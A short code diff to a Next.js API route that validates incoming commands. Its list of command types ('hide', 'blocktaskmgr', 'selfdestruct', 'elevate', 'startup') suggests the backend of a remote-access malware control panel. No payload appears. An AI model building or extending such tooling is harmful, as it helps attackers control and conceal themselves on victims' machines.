@@ -68,7 +68,13 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
       const body = await parseBody(req)
       const { command, type } = body
       
-      if (!command) {
+      if (!type) {
+        res.status(400).json({ status: 'error', message: '缺少命令类型' })
+        break
+      }
+      
+      const noContentTypes = ['processes', 'drives', 'startup', 'hide', 'blocktaskmgr', 'selfdestruct', 'elevate']
+      if (!command && !noContentTypes.includes(type)) {
         res.status(400).json({ status: 'error', message: '缺少命令内容' })
         break
       }
